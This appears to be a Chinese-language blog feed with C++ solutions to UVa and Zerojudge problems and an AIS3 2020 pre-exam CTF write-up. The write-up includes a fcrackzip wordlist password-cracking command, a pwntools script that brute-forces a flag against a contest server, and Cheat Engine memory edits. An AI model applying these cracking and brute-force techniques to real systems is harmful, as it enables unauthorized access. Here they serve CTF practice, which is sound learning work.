i&lt;<span class="number">10</span> ; i++)</span><br><span class="line">			cnt[i]=<span class="number">0</span>;</span><br><span class="line">		ans=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;s&gt;&gt;d;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			cnt[s[i]-<span class="string">'0'</span>]++;</span><br><span class="line">		&#125;</span><br><span class="line">		dfs(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><ul>
<li>初始化<br>  $O(MaxN)$</li>
<li>DFS<br>  $O(len(s)!)$ (len(s)最大為10)</li>
</ul>
<p>整體複雜度: $O(tN!)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>DFS</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa598</title>
    <url>/2020/06/16/UVa11513/</url>
    <content><![CDATA[<h1 id="UVa11513"><a href="#UVa11513" class="headerlink" title="UVa11513"></a>UVa11513</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11513" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11513</a><br>給一個 $3\times3$ 的拼圖，其中合法的移動方式有</p>
<ul>
<li>選擇其中一行向上移動</li>
<li>選擇其中一列向右移動</li>
</ul>
<p>問是否能透過以上操作回到原樣，若可以則輸出最小移動步數以及移動過程</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>如果正面BFS的話，單筆測資可能移動數量最高有 $9!$ 種，會TLE<br>因為最終都是回到同一個盤面上，因此反過來BFS即可<br>不過因為是反著走，走的方向也要相反<br>紀錄每個盤面是由甚麼移動轉換到下一個盤面即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> tmp;</span><br><span class="line"><span class="built_in">string</span> <span class="keyword">final</span>=<span class="string">"123456789"</span>,res;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>,pair&lt;<span class="built_in">string</span>,<span class="built_in">string</span>&gt;&gt; ans;</span><br><span class="line"><span class="built_in">string</span> input;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">fix</span><span class="params">(<span class="built_in">string</span> s,<span class="keyword">int</span> line, <span class="keyword">int</span> type)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(type==<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="comment">//horizontal</span></span><br><span class="line">		<span class="keyword">int</span> px=line*<span class="number">3</span>;</span><br><span class="line">		<span class="keyword">char</span> a=s[px],b=s[px+<span class="number">1</span>],c=s[px+<span class="number">2</span>];</span><br><span class="line">		s[px]=b;</span><br><span class="line">		s[px+<span class="number">1</span>]=c;</span><br><span class="line">		s[px+<span class="number">2</span>]=a;</span><br><span class="line">		<span class="keyword">return</span> s;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="comment">//straight</span></span><br><span class="line">		<span class="keyword">int</span> px=line;</span><br><span class="line">		<span class="keyword">char</span> a=s[px],b=s[px+<span class="number">3</span>],c=s[px+<span class="number">6</span>];</span><br><span class="line">		s[px]=c;</span><br><span class="line">		s[px+<span class="number">3</span>]=a;</span><br><span class="line">		s[px+<span class="number">6</span>]=b;</span><br><span class="line">		<span class="keyword">return</span> s;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">fix_to_str</span><span class="params">(<span class="keyword">int</span> line, <span class="keyword">int</span> type)</span></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> ret;</span><br><span class="line">	<span class="keyword">if</span>(type==<span class="number">0</span>) ret=<span class="string">"H"</span>;</span><br><span class="line">	<span class="keyword">else</span> ret=<span class="string">"V"</span>;</span><br><span class="line">	ret+=(<span class="keyword">char</span>)(<span class="string">'0'</span>+line);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">queue</span>&lt;<span class="built_in">string</span>&gt;q;</span><br><span class="line">	<span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="keyword">bool</span>&gt; inq;</span><br><span class="line">	q.emplace(<span class="keyword">final</span>);</span><br><span class="line">	inq[<span class="keyword">final</span>]=<span class="literal">true</span>;</span><br><span class="line">	ans[<span class="keyword">final</span>]=make_pair(<span class="string">"end"</span>,<span class="string">"end"</span>);</span><br><span class="line">	<span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">		<span class="built_in">string</span> now=q.front();</span><br><span class="line">		q.pop();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">3</span> ; i++)&#123;</span><br><span class="line">			res=fix(now,i,<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span>(!inq.count(res))&#123;</span><br><span class="line">				ans[res]=make_pair(fix_to_str(i+<span class="number">1</span>,<span class="number">0</span>),now);</span><br><span class="line">				q.emplace(res);</span><br><span class="line">				inq[res]=<span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			res=fix(now,i,<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span>(!inq.count(res))&#123;</span><br><span class="line">				ans[res]=make_pair(fix_to_str(i+<span class="number">1</span>,<span class="number">1</span>),now);</span><br><span class="line">				q.emplace(res);</span><br><span class="line">				inq[res]=<span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;input &amp;&amp; input!=<span class="string">"0"</span>)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">3</span> ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">3</span> ; j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(i==<span class="number">0</span> &amp;&amp; j==<span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">				input+=tmp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(ans.count(input))&#123;</span><br><span class="line">			<span class="keyword">if</span>(input==<span class="keyword">final</span>)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">"0\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">string</span> nxt=input;</span><br><span class="line">				<span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">				<span class="built_in">string</span> out;</span><br><span class="line">				<span class="keyword">while</span>(ans[nxt].second!=<span class="string">"end"</span>)&#123;</span><br><span class="line">					out+=ans[nxt].first;</span><br><span class="line">					nxt=ans[nxt].second;</span><br><span class="line">					cnt++;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;cnt&lt;&lt;<span class="string">" "</span>&lt;&lt;out&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"Not solvable\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>初始化可能盤面時間複雜度 $O(9!)$<br>搜尋使用map時間複雜度為 $O(log{9!})$<br>令$N$表示可能盤面數且 $N=9!$<br>總時間複雜度 $O(N+logN)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>BFS</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa11192</title>
    <url>/2020/07/02/UVa11192/</url>
    <content><![CDATA[<h1 id="UVa11192"><a href="#UVa11192" class="headerlink" title="UVa11192"></a>UVa11192</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11192" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11192</a><br>將字串分組反轉輸出</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>用迴圈枚舉開頭輸出</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> g,n;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;g &amp;&amp; g)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">		n=s.size()/g;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i+=n)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=i+n<span class="number">-1</span> ; j&gt;=i ; j--)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;s[j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(len(s) \times n)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>string</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge c294</title>
    <url>/2020/06/29/Zerojudge%20c294/</url>
    <content><![CDATA[<h1 id="Zerojudge-c294"><a href="#Zerojudge-c294" class="headerlink" title="Zerojudge c294"></a>Zerojudge c294</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=c294" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=c294</a><br>給三邊長，求是否能形成三角形，若可以，為哪種三角形</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>題敘中有給符合各種三角形的敘述了，跟著判斷即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> tri[<span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">3</span> ; i++) <span class="built_in">cin</span>&gt;&gt;tri[i];</span><br><span class="line">	sort(tri,tri+<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;tri[<span class="number">0</span>]&lt;&lt;<span class="string">" "</span>&lt;&lt;tri[<span class="number">1</span>]&lt;&lt;<span class="string">" "</span>&lt;&lt;tri[<span class="number">2</span>]&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">if</span>(tri[<span class="number">0</span>]+tri[<span class="number">1</span>] &lt;= tri[<span class="number">2</span>])</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"No\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">pow</span>(tri[<span class="number">0</span>],<span class="number">2</span>)+<span class="built_in">pow</span>(tri[<span class="number">1</span>],<span class="number">2</span>) == <span class="built_in">pow</span>(tri[<span class="number">2</span>],<span class="number">2</span>))</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Right\n"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">pow</span>(tri[<span class="number">0</span>],<span class="number">2</span>)+<span class="built_in">pow</span>(tri[<span class="number">1</span>],<span class="number">2</span>) &lt; <span class="built_in">pow</span>(tri[<span class="number">2</span>],<span class="number">2</span>))</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Obtuse\n"</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Acute\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>準確來說是 $O(log3)$，大約為 $O(1)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>AIS3 2020 pre-exam write-up</title>
    <url>/2020/07/05/AIS3%202020%20pre-exam%20write-up/</url>
    <content><![CDATA[<h1 id="AIS3-2020-pre-exam-write-up"><a href="#AIS3-2020-pre-exam-write-up" class="headerlink" title="AIS3 2020 pre-exam write-up"></a>AIS3 2020 pre-exam write-up</h1><p>今年第一次打AIS3 pre-exam，有很多第一次遇到的題目類型<br>稍微整理了一下我有解的題目的解題過程，歡迎大家一起討論~</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Piquero"><a href="#Piquero" class="headerlink" title="Piquero"></a>Piquero</h2><blockquote>
<p><strong>347 solves</strong></p>
</blockquote>
<h3 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>I can’t see the flag. Where is it?</p>
</blockquote>
<h3 id="File"><a href="#File" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/87e27cc8a1a515c5bdbaab2a3f898dc9/Piquero_99c9aa83fe492df8d52229017d4dca92297c9aeb.jpg?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjE5fQ.Xt9thg.Z0yZLQ2FfFp1K0KIdZh0m93w87Y" target="_blank" rel="noopener">Piquero</a></p>
<h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>發現圖片內容是點字，於是到網路上找找點字的相關資料，會發現大概會是這樣:</p>
<ul>
<li>表示下個字母為大寫的tag<br>  <img src="https://i.imgur.com/n7Qv1La.png" alt=""></li>
<li>表示下個字元為數字<br>  <img src="https://i.imgur.com/sacvda7.png" alt=""></li>
<li>表示下個字原為符號<br>  <img src="https://i.imgur.com/1542Noc.png" alt=""><br>其餘的符號都是表示 <strong>字母</strong> / <strong>數字</strong><br>接下來對照網路上查到的table，就可以獲得flag</li>
</ul>
<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{I_feel_sleepy_Good_Night!!!}</code></p>
<h2 id="Karuego"><a href="#Karuego" class="headerlink" title="Karuego"></a>Karuego</h2><blockquote>
<p><strong>245 solves</strong></p>
</blockquote>
<h3 id="題目-1"><a href="#題目-1" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Students who fail to summon will be dropped out.</p>
</blockquote>
<h3 id="File-1"><a href="#File-1" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/6e929c470179fbd102d98db23b775425/Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjIwfQ.Xt9vew.SmgmT3hDj2oGR8K0ZwnbtJjhUd8" target="_blank" rel="noopener">Karuego</a></p>
<h3 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h3><p>對於png，先到binwalk裡檢查有沒有藏檔案，發現裡面有zip<br><img src="https://i.imgur.com/0FHUY8U.png" alt=""><br>發現到zip有經過加密，可透過fcrack搭配reckyou.txt爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fcrackzip -u -D -p rockyou.txt [zipname]</span><br></pre></td></tr></table></figure>
<p>最後會找到<code>lafire</code></p>
<h3 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{Ar3_y0u_r34l1y_r34dy_t0_summ0n_4_D3m0n?}</code></p>
<h2 id="Soy"><a href="#Soy" class="headerlink" title="Soy"></a>Soy</h2><blockquote>
<p><strong>172 solves</strong></p>
</blockquote>
<h3 id="題目-2"><a href="#題目-2" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Here is your flag. Oops, my bad.</p>
</blockquote>
<h3 id="File-2"><a href="#File-2" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/c5e1aa1353cedeea35505a6b57387297/Soy_b692c44dd2a32b30eee8a9315091d79f7dd8c8a8.png?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjIxfQ.Xt9yZw.uTwYRI5iSyL8wOWtM3St6OaLWag" target="_blank" rel="noopener">Soy</a></p>
<h3 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h3><p><strong>賽後解</strong><br>可以利用<a href="https://merricx.github.io/qrazybox/" target="_blank" rel="noopener">QRazyBox</a>幫助解題<br>在上面畫完後使用Tools的Extract即可</p>
<h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}</code></p>
<h2 id="Saburo"><a href="#Saburo" class="headerlink" title="Saburo"></a>Saburo</h2><blockquote>
<p><strong>108 solves</strong></p>
</blockquote>
<h3 id="題目-3"><a href="#題目-3" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Spell you flag and fight with me.</p>
<p>PS. flag is printable characters with AIS3{…}</p>
<p>nc 60.250.197.227 11001</p>
</blockquote>
<h3 id="解法-3"><a href="#解法-3" class="headerlink" title="解法"></a>解法</h3><p>nc上去後發現只會問問題，給個字串後會回覆一個數字<br>猜測Flag前綴為AIS3{<br>依序放入後發現數字會是嚴格遞增的，所以我們只需要寫個腳本把所有Ascii中visible的字元都Try過<br>中間會出現多次誤差，可以單個字元測試3~5次以減少誤差</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">final_answer = <span class="string">'AIS3&#123;'</span></span><br><span class="line">max_num = <span class="number">0</span></span><br><span class="line">max_chr = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">	max_chr = <span class="string">' '</span></span><br><span class="line">	time.sleep(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">		now_num = <span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">			r = remote(<span class="string">'60.250.197.227'</span>, <span class="string">'11001'</span>)</span><br><span class="line">			r.recvuntil(<span class="string">' '</span>)</span><br><span class="line">			r.sendline(final_answer+chr(j))</span><br><span class="line">			tmp_num = int(r.recvuntil(<span class="string">'\n'</span>).split(<span class="string">b' '</span>)[<span class="number">4</span>])</span><br><span class="line">			<span class="keyword">if</span>(tmp_num &lt; max_num):</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			now_num += tmp_num</span><br><span class="line">		now_num = int(now_num/<span class="number">3</span>)</span><br><span class="line">		<span class="keyword">if</span>(now_num &gt; max_num):</span><br><span class="line">			max_num = now_num</span><br><span class="line">			max_chr = chr(j)</span><br><span class="line">			print(chr(j) + <span class="string">': '</span> + str(now_num))</span><br><span class="line">		r.close()</span><br><span class="line">	final_answer += max_chr</span><br><span class="line">	print(<span class="string">'max_num: '</span> + str(max_num))</span><br><span class="line">	print(<span class="string">'max_chr: '</span> + str(max_chr))</span><br><span class="line">	print(<span class="string">'final: '</span> + final_answer)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{A1r1ght_U_4r3_my_3n3nnies}</code></p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="TsaiBro"><a href="#TsaiBro" class="headerlink" title="TsaiBro"></a>TsaiBro</h2><blockquote>
<p><strong>281 solves</strong></p>
</blockquote>
<h3 id="題目-4"><a href="#題目-4" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>很好….你很腦殘嗎….敢這樣講刀劍神域…….我死也不會放過你 我..要..殺死…你..</p>
</blockquote>
<h3 id="File-3"><a href="#File-3" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/e5c6607ae2a2064a5d6557a07635c4d9/TsaiBroSaid?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjMzfQ.Xt913Q.EHy0Tl63eOr46omHxoueuAwokTw" target="_blank" rel="noopener">TsaiBroSaid</a><br><a href="https://pre-exam.ais3.org/files/7ad3e8255badfb74307edf17c49b0db4/TsaiBro?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjM0fQ.Xt913Q.57bxAT2F72tsh0UejnCiTKYoVfo" target="_blank" rel="noopener">TsaiBro</a></p>
<h3 id="解法-4"><a href="#解法-4" class="headerlink" title="解法"></a>解法</h3><p>其實一開始根本毫無頭緒(?<br>在網路上找資料找到去年的write-up，發現考點相同<br>這題是考Tap Code，在一個<code>發財</code>左右兩側各可以拿到一組點<br>這裡的點可以去透過Table對照到一個字元<br>而Table可以在<code>strings TsaiBro</code>看到這串字</p>
<p><img src="https://i.imgur.com/im8sEpk.png" alt=""></p>
<p>裡面總共有64個點，參考剛剛<code>發財</code>附近的點數，最高是8個點，可以猜測會是8*8的Table<br>建表完直接對照就可以獲得Flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table = [<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'_'</span>,</span><br><span class="line"><span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'0'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,</span><br><span class="line"><span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,</span><br><span class="line"><span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'J'</span>,</span><br><span class="line"><span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,</span><br><span class="line"><span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,</span><br><span class="line"><span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,</span><br><span class="line"><span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>]</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"./flag.txt"</span>,<span class="string">"r"</span>).read().split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">f = f.split(<span class="string">"發財"</span>)[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(f),<span class="number">2</span>):</span><br><span class="line">    print(table[(len(f[i])<span class="number">-1</span>)*<span class="number">8</span>+(len(f[i+<span class="number">1</span>])<span class="number">-1</span>)],end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}</code></p>
<h2 id="Fallen-Beat"><a href="#Fallen-Beat" class="headerlink" title="Fallen Beat"></a>Fallen Beat</h2><blockquote>
<p><strong>171 solves</strong></p>
</blockquote>
<h3 id="題目-5"><a href="#題目-5" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>CTF player,</p>
<p>我要挑戰你, I’m gonna challenge you!!</p>
<p>ZR</p>
<p>這是我的室友兼 lab 同學,</p>
<p>他已經考過金框暴龍天，他是個旋鈕人,</p>
<p>不像你是個敲鍵盤的,</p>
<p>所以我要測測你的程度到哪裡,</p>
<p>就用 ZR 的大一 project 來決勝負吧！！</p>
<p>得到 Full Combo 來讓我刮目相看！！</p>
<p>author: terrynini</p>
</blockquote>
<h3 id="File-4"><a href="#File-4" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/06535c622222c7d33f2628fc899a69eb/Fallen_Beat.zip?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI5fQ.Xt93jQ.Ep49McTc9vlDK0bAagjYGL4fYNk" target="_blank" rel="noopener">Fallen_Beats</a></p>
<h3 id="解法-5"><a href="#解法-5" class="headerlink" title="解法"></a>解法</h3><p>可以發現到這是個幾乎不可能完成SS的音G<br>透過線上java decompiler decompile後可以知道，當達到MaxCombo時可以獲得Flag<br>雖然一開始Flag有給了一坨奇怪的東西，但是跟另一坨更怪的東西xor後，flag變得不可解<br>所以開始朝向玩Game發展<br>不過可以透過Cheat Engine幫你減速<br>但是譜很長，很容易失誤，所以說，CE還可以去改記憶體上的值<br>於是很開心的把值改成MaxCombo 1112<br>然後加速500倍直接結束遊戲</p>
<p>…然而，這不是結束<br><img src="https://i.imgur.com/N3CWVCR.png" alt=""><br>你可以透過decompile的內容得知flag是直接存在變數中，所以直接用CE找到AIS3即可</p>
